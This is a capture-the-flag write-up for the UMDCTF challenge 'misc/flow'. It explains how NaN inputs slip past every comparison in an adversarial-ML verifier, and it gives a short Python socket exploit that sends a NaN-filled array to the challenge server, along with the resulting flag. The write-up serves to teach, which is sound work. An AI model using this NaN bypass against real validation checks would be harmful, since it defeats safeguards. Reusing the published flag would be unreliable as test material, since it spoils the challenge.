# misc/flow

## Flag

`UMDCTF{id_like_to_thank_athalye_carlini_and_wagner_for_their_research}`

## Idea

The challenge looks like an adversarial-ML problem:

- stay within `L_inf <= 0.05`
- keep `flow.log_prob(x) >= threshold`
- after purification, force the predictor to classify as class `1`

At first glance this suggests a white-box optimization attack, but the verifier has a much simpler bug: it never rejects `NaN`.

## Bug

Relevant checks from `challenge.py`:

```python
linf = float(np.max(np.abs(sub - x_ref)))
if linf > EPS + 1e-6:
    return False

lp = float(flow.log_prob(t).item())
if lp < lp_thresh:
    return False

probs = F.softmax(predictor(purify(t, flow)), dim=1).numpy()[0]
if probs[1] < CONF_FLIP:
    return False
```

If `sub` contains `NaN` values, then:

- `linf` becomes `nan`, and `nan > EPS` is `False`
- `lp` becomes `nan`, and `nan < lp_thresh` is `False`
- `probs[1]` becomes `nan`, and `nan < CONF_FLIP` is `False`

So every guard is bypassed and the function returns success.

## Exploit

Send a base64-encoded `.npy` file containing a `(5, 64)` `float32` array filled with `NaN`.

Minimal exploit:

```python
import base64
import io
import socket
import numpy as np

arr = np.full((5, 64), np.nan, dtype=np.float32)
buf = io.BytesIO()
np.save(buf, arr)
payload = base64.b64encode(buf.getvalue()) + b"\n"

with socket.create_connection(("challs.umdctf.io", 30302)) as s:
    s.sendall(payload)
    print(s.recv(65536).decode())
```

## Result

The remote service responded with:

```text
FLAG: UMDCTF{id_like_to_thank_athalye_carlini_and_wagner_for_their_research}
```
